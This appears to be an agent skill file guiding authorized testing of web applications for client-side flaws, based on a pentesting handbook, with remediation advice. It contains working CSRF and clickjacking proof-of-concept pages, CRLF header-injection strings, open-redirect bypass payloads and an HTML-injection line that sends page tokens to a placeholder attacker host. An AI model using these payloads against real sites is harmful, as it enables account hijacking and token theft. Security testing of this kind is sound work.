---
name: client-side-attack-testing
description: |
  Test web applications for client-side security vulnerabilities spanning two major attack families: client-side trust anti-patterns and user-targeting attacks. Use this skill when: auditing hidden form fields, HTTP cookies, URL parameters, Referer headers, or ASP.NET ViewState for client-side data transmission vulnerabilities; bypassing HTML maxlength limits, JavaScript validation, or disabled form elements to probe server-side enforcement gaps; intercepting and analyzing browser extension traffic (Java applets, Flash, Silverlight) and handling serialized data; testing for cross-site request forgery (CSRF) by identifying cookie-only session tracking and constructing auto-submitting PoC forms; testing for clickjacking and UI redress attacks by checking X-Frame-Options headers and constructing iframe overlay proofs of concept; detecting cross-domain data capture vectors via HTML injection and CSS injection; auditing Flash crossdomain.xml and HTML5 CORS Access-Control-Allow-Origin configurations for overly permissive same-origin policy exceptions; finding HTTP header injection and response splitting vulnerabilities via CRLF injection; identifying open redirection vulnerabilities and testing filter bypass payloads; testing cookie injection and session fixation; assessing local privacy exposure through persistent cookies, cached content lacking no-cache directives, autocomplete on sensitive fields, and HTML5 local storage. Excludes XSS (covered by xss-detection-and-exploitation). Maps to OWASP Testing Guide (OTG-INPVAL-*, OTG-SESS-*, OTG-CLIENT-*), CWE-352 (CSRF), CWE-601 (Open Redirect), CWE-113 (HTTP Header Injection), CWE-565 (Reliance on Cookies), CWE-1021 (Improper Restriction of Rendered UI Layers), CWE-311 (Missing Encryption of Sensitive Data), and OWASP Top 10 A01:2021, A03:2021, A05:2021.
version: 1
status: draft
depends-on: []
source-books:
  - id: web-application-hackers-handbook
    title: "The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws"
    authors: ["Dafydd Stuttard", "Marcus Pinto"]
    edition: 2
    chapters: [5, 13]
    pages: "117-157, 501-560"
tags: [csrf, clickjacking, ui-redress, open-redirect, http-header-injection, session-fixation, cookie-injection, client-side-controls, hidden-form-fields, viewstate, javascript-validation, browser-extensions, same-origin-policy, cors, crossdomain-xml, local-privacy, burp-suite, penetration-testing, appsec, cwe-352, cwe-601, cwe-113, cwe-565, cwe-1021]
execution:
  tier: 2
  mode: hybrid
  inputs:
    - type: document
      description: "HTTP proxy traffic logs, Burp Suite project file, or captured request/response pairs from the target application"
    - type: codebase
      description: "Application source code or HTML source for white-box review of client-side controls and data transmission"
  tools-required: [Read, Grep, Write]
  tools-optional: [Bash, WebFetch]
  mcps-required: []
  environment: "Authorized security testing context required. Burp Suite or equivalent intercepting proxy configured between browser and target. Clean browser profile recommended for local privacy testing."
discovery:
  goal: "Identify all exploitable client-side control bypasses and user-targeting vulnerabilities; produce a structured findings report with PoC evidence, CWE mappings, severity ratings, and remediation guidance"
  tasks:
    - "Enumerate all client-side data transmission mechanisms (hidden fields, cookies, URL params, ViewState) and attempt tampering"
    - "Identify and bypass all client-side input validation (length limits, JavaScript validation, disabled elements)"
    - "Intercept browser extension traffic and attempt parameter manipulation or component decompilation"
    - "Test all state-changing application functions for CSRF vulnerability"
    - "Check all pages for X-Frame-Options and construct clickjacking proof of concept where absent"
    - "Identify cross-domain policy files and CORS headers; assess permission scope"
    - "Probe HTTP headers for CRLF injection; test open redirection parameters with bypass payloads"
    - "Test session token behavior across login boundary for session fixation; test cookie injection vectors"
    - "Audit local data storage: persistent cookies, cache directives, autocomplete attributes, HTML5 storage"
  audience:
    roles: ["penetration-tester", "application-security-engineer", "security-minded-developer", "bug-bounty-researcher"]
    experience: "intermediate-to-advanced — assumes familiarity with HTTP, intercepting proxies (Burp Suite), HTML/JavaScript, and basic session management concepts"
  triggers:
    - "Penetration test of a web application requiring client-side vulnerability coverage"
    - "Security assessment of an e-commerce or banking application with payment flows"
    - "Audit of an application using browser extension components (Java applets, Flash, Silverlight)"
    - "Assessment of a multi-user application where one user could target another"
    - "Review of OWASP Top 10 A01/A03/A05 finding categories"
    - "Pre-launch security review checking for CSRF, clickjacking, and open redirection"
---

# Client-Side Attack Testing

## When to Use

Use this skill when you need to assess a web application for vulnerabilities that either trust data transmitted through the client without server-side verification, or that allow one user to target another user's browser session. These two families are conceptually distinct but share the same root: the server's failure to treat the client as an untrusted environment.

This skill covers authorized penetration testing and security code review. It is not a substitute for legal authorization to test a target application. XSS is excluded here and covered by the `xss-detection-and-exploitation` skill.

---

## Core Concepts

### Why Client-Side Controls Fail

The browser executes entirely within the user's control. Any restriction enforced only on the client — a hidden field the application assumes will not be modified, a JavaScript validation gate the application assumes will run — can be bypassed by an attacker who intercepts requests. The only controls that matter for security are those enforced on the server.

### Two Attack Families

**Client-side trust anti-patterns** occur when the server transmits data to the client and reads it back without verifying its integrity. Every channel — hidden form fields, HTTP cookies, URL parameters, the Referer header, ASP.NET ViewState — is attacker-controllable via an intercepting proxy.

**User-targeting attacks** exploit the browser's normal behavior to induce a victim user to perform unintended actions (CSRF, clickjacking) or to leak data to the attacker's domain (cross-domain data capture, open redirection). These attacks do not require the attacker to log in — they ride the victim's authenticated session.

---

## Process

### Phase 1: Client-Side Data Transmission Testing

**Step 1: Identify all client-side data transmission mechanisms.**
Using your intercepting proxy in passive mode, browse the entire application and catalog every location where data is passed to the client and expected back:

- Hidden form fields (`<input type="hidden">`)
- HTTP cookies set by the server (`Set-Cookie` headers)
- URL query string parameters that appear to carry server-state (price codes, product IDs with apparent pre-computation, discount flags)
- The `Referer` header used in multi-step workflows
- ASP.NET `__VIEWSTATE` parameters

WHY: Applications transmit data via the client for performance, scalability, and third-party integration reasons. Developers often assume the transmission channel is tamper-proof. It never is. Identifying these locations is prerequisite to testing them.

**Step 2: Infer the role of each parameter.**
For each item identified, determine from context what server-side logic depends on it. Look for names like `price`, `discount`, `role`, `isAdmin`, `uid`, `returnUrl`. Even opaque values may be encodings of sensitive data.

WHY: Blind tampering generates noise. Understanding the role of a parameter allows you to craft meaningful modifications — for example, setting `price=1` on a checkout form, or flipping `discount=0` to `discount=100`.

**Step 3: Modify each value and observe server behavior.**
Use your proxy's intercept or Repeater tab to change parameter values:

- For hidden form fields: change the value in the intercepted POST request
- For cookies: modify the cookie header in subsequent requests or in the server response that sets the cookie
- For URL parameters: modify directly in the request
- For the Referer header: craft a request directly to a protected endpoint with a spoofed Referer matching the expected prior step
- For opaque values: attempt Base64 decoding (try starting decodes at offsets 0, 1, 2, 3 to account for Base64 block alignment); replay values from other contexts; submit malformed variants

WHY: The Referer header and cookies are not "more tamper-proof" than URL parameters — this is a common developer myth. Any intercepting proxy can modify all request headers with equal ease.

**Step 4: Test ASP.NET ViewState specifically.**
For ASP.NET applications, use Burp Suite's built-in ViewState parser (the ViewState tab in the proxy intercept panel):

1. Check whether MAC protection is enabled (indicated by a 20-byte hash at the end of the ViewState structure and the Burp parser reporting "MAC is enabled")
2. Even if MAC-protected, decode the ViewState to inspect whether the application stores sensitive data within it
3. If MAC protection is absent, edit the decoded ViewState contents in Burp's hex editor to modify any custom application data stored there
4. Test each significant page independently — MAC protection may be enabled globally but disabled on specific pages

WHY: ViewState with MAC protection disabled allows arbitrary modification of server-side state data, which can lead to price manipulation, privilege escalation, or injection vulnerabilities if the deserialized data is used unsafely.

---

### Phase 2: Client-Side Input Validation Bypass

**Step 1: Identify HTML maxlength restrictions.**
Search response HTML for `maxlength` attributes on input elements. Submit values exceeding the declared length via proxy intercept (the browser enforces maxlength client-side only).

WHY: If the server does not replicate the length check, overlong input may trigger SQL injection, cross-site scripting, buffer overflow, or other secondary vulnerabilities. Accepting the overlong input confirms the client-side validation is the only gate.

**Step 2: Identify JavaScript validation on form submission.**
Look for `onsubmit` attributes on form tags or validation functions called before form submission. Methods to bypass:

- Submit a valid value in the browser, intercept the request in the proxy, and replace the value with your desired payload (cleanest approach, does not affect application UI state)
- Disable JavaScript in the browser before submitting the form
- Intercept the server response containing the JavaScript validation code and neutralize the validation function (for example, change the function body to `return true`)

Test each field with invalid data individually, keeping all other fields valid, because the server may stop processing after the first invalid field.

WHY: Client-side validation without server-side replication is purely a user experience feature, not a security control.

**Step 3: Identify and submit disabled form elements.**
Inspect page source (not just proxy traffic — disabled elements are not submitted by the browser, so they do not appear in normal traffic) for `disabled="true"` attributes. Submit the disabled parameter name and value manually via proxy.

WHY: Disabled fields often represent parameters that were active during development or testing. The server-side handler may still process them if submitted, exposing price manipulation or feature-flag bypass opportunities.

---

### Phase 3: Browser Extension Analysis

**Step 1: Intercept browser extension traffic.**
Configure your proxy to intercept traffic from Java applets, Flash objects, or Silverlight applications. If the proxy does not automatically intercept extension traffic, configure the browser's JVM or Flash proxy settings to route through your proxy.

**Step 2: Handle serialized data formats.**
Identify the serialization format from the `Content-Type` header:
- `application/x-java-serialized-object` — Java serialization; use DSer (Burp plugin) to convert to XML, edit, and re-serialize
- AMF (Action Message Format) — Flash remoting; use Burp's AMF support or the AMF plugin
- Custom binary formats — attempt to infer structure from repeated byte patterns; look for length-prefixed strings

**Step 3: Decompile the component bytecode if proxy-level manipulation is insufficient.**
- Java applets: use `javap -c` for disassembly or a full decompiler such as JD-GUI or Procyon to recover source code
- Flash objects: download the `.swf` file and use Flasm or JPEXS Free Flash Decompiler
- Silverlight: extract the `.xap` archive and use dotPeek or ILSpy on the contained DLLs

Review decompiled code for hardcoded credentials, hidden API endpoints, client-side business logic, and validation that should occur server-side.

WHY: Browser extensions enforce validation inside a compiled binary that developers assume cannot be inspected. Decompilation proves that assumption false and often reveals critical security logic implemented entirely on the client.

---

### Phase 4: Cross-Site Request Forgery Testing

**Step 1: Identify CSRF-vulnerable functions.**
A function is potentially vulnerable to CSRF when all three of the following hold:
1. It performs a sensitive or privileged action (state change, account modification, fund transfer, user creation)
2. The application relies solely on HTTP cookies to track session state (no additional token in the request body or URL)
3. All required request parameters can be determined by an attacker in advance (no unpredictable nonces)

**Step 2: Construct a CSRF proof of concept.**
For GET-based actions, use an `<img>` tag with `src` set to the target URL:

```html
<img src="https://target.example.com/action?param=value">
```

For POST-based actions, construct an auto-submitting form:

```html
<html><body>
<form action="https://target.example.com/action" method="POST">
  <input type="hidden" name="param1" value="value1">
  <input type="hidden" name="param2" value="value2">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

**Step 3: Verify the attack.**
While authenticated in the target application in one browser tab, load the PoC page in the same browser. Confirm the action executes within the victim's session.

**Step 4: Assess anti-CSRF token quality if present.**
If the application includes a per-request token, verify:
- The token is tied to the specific user's session (not shared across users)
- The token value is unpredictable (sufficient entropy, not sequentially issued)
- The token cannot be obtained cross-domain via JavaScript hijacking or CSS injection
- Multi-step flows re-validate the token at every step, not only the first

WHY: CSRF exploits the browser's automatic cookie submission. The only reliable defenses are session-bound unpredictable tokens in the request body, the SameSite cookie attribute, or re-authentication for sensitive actions.

---

### Phase 5: Clickjacking and UI Redress Testing

**Step 1: Check for X-Frame-Options.**
For every sensitive page (login, account settings, fund transfer confirmation, admin functions), examine the HTTP response headers for:

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
```

If neither is present, the page is potentially vulnerable to UI redress attacks.

**Step 2: Construct a clickjacking proof of concept.**
Create an attacker page that loads the target page in a transparent iframe overlaid on a decoy interface:

```html
<html><head><style>
  iframe { opacity: 0.0; position: absolute; top: 150px; left: 200px;
           width: 600px; height: 400px; z-index: 2; }
  button { position: absolute; top: 150px; left: 200px; z-index: 1; }
</style></head><body>
  <button>Click here to win a prize!</button>
  <iframe src="https://target.example.com/confirm-transfer"></iframe>
</body></html>
```

Adjust iframe positioning to align the decoy button with the target page's sensitive action button.

**Step 3: Test for mobile interface gaps.**
Check mobile-specific UI paths (e.g., `/mobile/` subdirectories) separately. Anti-framing defenses are frequently applied only to the desktop interface.

WHY: UI redress bypasses token-based CSRF defenses because the iframe loads the target page normally — the token is generated and submitted within the framed context. The attack works even when CSRF tokens are correctly implemented.

---

### Phase 6: Cross-Domain Policy and Same-Origin Policy Analysis

**Step 1: Check Flash and Silverlight cross-domain policy files.**
Request `/crossdomain.xml` (Flash/Silverlight) and `/clientaccesspolicy.xml` (Silverlight) from the target origin. Evaluate:

- `<allow-access-from domain="*" />` — any domain can perform two-way interaction; critical finding
- Wildcarded subdomains — XSS on any allowed subdomain can compromise the application
- Intranet hostnames disclosed in the policy file

**Step 2: Test HTML5 CORS configuration.**
Add an `Origin: https://attacker.example.com` header to sensitive requests and examine the response for:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: https://attacker.example.com
Access-Control-Allow-Credentials: true
```

An `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` is a critical misconfiguration. Also send an `OPTIONS` preflight request to enumerate which methods and headers are permitted cross-domain.

**Step 3: Test for cross-domain data capture via HTML/CSS injection.**
Where the application reflects limited HTML into responses (HTML injection short of full XSS), test whether the injection point precedes sensitive data such as anti-CSRF tokens. Inject:

```html
<img src='https://attacker.example.com/capture?html=
```

If this unclosed image tag slurps subsequent page content into the URL, sensitive tokens may be transmitted to the attacker's server. Also test CSS injection by injecting `()*(font-family:'` where text injection is possible, and attempt to load the target page as a stylesheet cross-domain.

---

### Phase 7: HTTP Header Injection and Open Redirection

**Step 1: Find header injection entry points.**
Identify all locations where user-supplied data is incorporated into HTTP response headers — commonly the `Location` header in redirects and the `Set-Cookie` header in preference-setting functions. Submit the following test payload in each parameter:

```
English%0d%0aFoo:+bar
```

If the response contains a header line `Foo: bar`, the application is vulnerable. Also try `%0a`, `%250d%250a`, `%0d%0d%%0a0a`, and leading-space bypasses if sanitization is detected.

**Step 2: Assess exploitation impact.**
If arbitrary headers can be injected, demonstrate:
- Cookie injection: inject `Set-Cookie` headers to plant arbitrary cookies in the victim's browser
- Response splitting for cache poisoning: inject a complete second HTTP response body into the cache for a subsequently requested URL

**Step 3: Identify open redirection parameters.**
Walk through the application in the proxy and identify every redirect. For each redirect where user-controlled input determines the target URL, test:

1. Modify the target to an absolute external URL: `https://attacker.example.com`
2. If blocked, test bypass variants:
   - Protocol case: `HtTp://attacker.example.com`
   - Null byte prefix: `%00http://attacker.example.com`
   - Protocol-relative: `//attacker.example.com`
   - URL-encoded: `%68%74%74%70%3a%2f%2fattacker.example.com`
   - Double encoding: `%2568%2574%2574%70%253a%252f%252fattacker.example.com`
   - Domain confusion if app checks for own domain: `http://attacker.example.com?http://target.example.com`
3. If the application prepends a fixed prefix, test whether omitting the trailing slash causes the domain to be treated as a subdomain of an attacker-controlled domain: `redir=.attacker.example.com`

---

### Phase 8: Cookie Injection and Session Fixation

**Step 1: Test for cookie injection vectors.**
Identify functions that accept user input and set it into a cookie value. Inject a newline sequence to add a second `Set-Cookie` header (see HTTP header injection above). Also check whether XSS in related subdomains or parent domains can set cookies for the target application's domain.

**Step 2: Test for session fixation.**
1. As an unauthenticated user, request the login page and record the session token issued
2. Using that token, perform a login with valid credentials
3. If the application does not issue a new session token on successful authentication, it is vulnerable to session fixation
4. Test whether the application accepts arbitrary session tokens it has never issued — if so, the vulnerability is significantly more severe

WHY: Session fixation allows an attacker who can plant a known token in a victim's browser (via cookie injection, URL parameter, or CSRF against the login form) to hijack the victim's authenticated session without ever knowing the victim's credentials.

---

### Phase 9: Local Privacy Testing

**Step 1: Audit persistent cookies.**
Review all `Set-Cookie` headers for the `expires` attribute. Any cookie with a future expiry date is persisted to disk. If the cookie contains sensitive data (session tokens, user identifiers, preference data with security implications), document it as a local privacy finding.

**Step 2: Audit cache directives.**
For every HTTP page that displays sensitive data, verify the presence of all three directives:
```
Cache-Control: no-cache
Pragma: no-cache
Expires: 0
```
If absent, verify that the page is served over HTTPS (not HTTP, where caching is more likely). Validate empirically by clearing the browser cache, accessing the sensitive page, and inspecting the browser's disk cache directory.

**Step 3: Audit autocomplete on sensitive input fields.**
Inspect the HTML source of all forms that capture sensitive data (passwords, credit card numbers, personal identification). Verify that `autocomplete="off"` is set on the `<form>` tag or on the individual sensitive `<input>` tags.

**Step 4: Audit HTML5 local storage.**
Using browser developer tools, inspect `localStorage` and `sessionStorage` for sensitive data stored by the application. `sessionStorage` is cleared when the tab closes; `localStorage` persists indefinitely.

---

## Examples

### Example 1: Hidden Field Price Manipulation

**Scenario:** E-commerce application transmitting product price in a hidden form field for use at checkout.

**Trigger:** During application mapping, proxy traffic reveals `<input type="hidden" name="price" value="449">` in the purchase form HTML.

**Process:**
1. Add item to cart and proceed to checkout in browser
2. Intercept the POST request in Burp Suite when the Buy button is clicked
3. In the intercepted request body, locate `quantity=1&price=449`
4. Modify `price=449` to `price=1` and forward the request
5. Also test `price=-100` to check for negative-price acceptance

**Output:** If the order is processed at the modified price, document as CWE-565 (Reliance on Cookies Without Validation) / improper trust in client-submitted data. Remediation: look up price server-side from the product catalog at time of purchase; never trust client-submitted price values.

---

### Example 2: CSRF Against Account Email Change

**Scenario:** A web application allows users to change their email address via a POST request that relies solely on the session cookie for authentication.

**Trigger:** Application mapping reveals `POST /account/change-email` accepts `email=new@example.com` with no additional token in the request body.

**Process:**
1. Confirm no anti-CSRF token is present in the request or the form HTML
2. Confirm no `SameSite` attribute is set on the session cookie
3. Construct the PoC page with an auto-submitting form pointing to `/account/change-email` with `email=attacker@attacker.example.com`
4. While authenticated in the target application, load the PoC in the same browser session
5. Confirm that the email address is changed to the attacker-controlled address

**Output:** Document as CWE-352 (Cross-Site Request Forgery), severity High. Remediation: implement synchronizer token pattern (per-session or per-request CSRF token in request body), or set `SameSite=Strict` on session cookies.

---

### Example 3: Clickjacking on Fund Transfer Confirmation

**Scenario:** A banking application's fund transfer confirmation page (`/transfer/confirm`) lacks `X-Frame-Options`.

**Trigger:** Security header review reveals `X-Frame-Options` is absent from the `/transfer/confirm` response.

**Process:**
1. Construct the iframe overlay PoC with the confirmation page loaded transparently
2. Position the transparent iframe so the Confirm button aligns with a decoy "Click to claim reward" button on the attacker page
3. Open the PoC in a browser where the victim user is authenticated to the banking application
4. Click the decoy button — verify the fund transfer is confirmed within the framed application

**Output:** Document as CWE-1021 (Improper Restriction of Rendered UI Layers / Clickjacking), severity High. Remediation: add `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` to all sensitive pages. Note: JavaScript framebusting is not a reliable substitute — it can be circumvented via sandbox iframe attributes.

---

## Remediation Reference

| Vulnerability | Root Cause | Remediation |
|---|---|---|
| Hidden field / cookie / URL param tampering | Server trusts client-submitted data | Store and look up all security-relevant data server-side; validate every parameter server-side |
| Referer-header access control | Referer is optional and attacker-controllable | Use proper session-based authorization; never use Referer as an access control gate |
| ViewState tampering | MAC protection disabled | Enable `EnableViewStateMac`; do not store sensitive data in ViewState |
| JavaScript validation bypass | No server-side replication | Treat all client-side validation as UX only; replicate every constraint server-side |
| CSRF | Cookie-only session tracking | Implement synchronizer token pattern or use `SameSite=Strict` cookies |
| Clickjacking | Missing framing controls | Set `X-Frame-Options: DENY` or `frame-ancestors 'none'` CSP |
| Open redirection | User input controls redirect target | Use an allow-list of valid redirect targets; reject absolute URLs; prepend own origin with trailing slash |
| HTTP header injection | Unsanitized user input in headers | Strip all characters with ASCII code below 0x20 from data inserted into headers |
| Session fixation | Session token not rotated at login | Issue a new session token immediately after successful authentication |
| Local privacy: cached content | Missing cache-control directives | Set `Cache-Control: no-cache`, `Pragma: no-cache`, `Expires: 0` on all sensitive pages |
| Local privacy: autocomplete | Missing autocomplete=off | Set `autocomplete="off"` on all forms and fields capturing sensitive data |
